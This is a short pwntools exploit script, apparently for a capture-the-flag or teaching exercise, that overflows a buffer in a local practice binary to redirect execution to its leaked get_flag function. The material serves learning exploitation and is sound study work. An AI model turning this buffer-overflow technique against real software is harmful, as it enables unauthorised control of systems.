#!/usr/bin/env python
from pwn import *

program = process("./get_flag_example")

print(program.recvuntil(b"get_flag is at 0x"))

# If ASLR is disabled, pwntools provides nicer ways
# to get the address of functions with the ELF class.
get_flag_addr = int(program.recvline(),16)
print(f"get_flag is at {hex(get_flag_addr)}")

# Just to pause execution in case you want
# to attach to gdb/rizin
input()
program.sendline(b"abcdefghijklmnopqrstuv" + p32(get_flag_addr))
print(program.recvline())
print(program.recvline())

program.interactive()
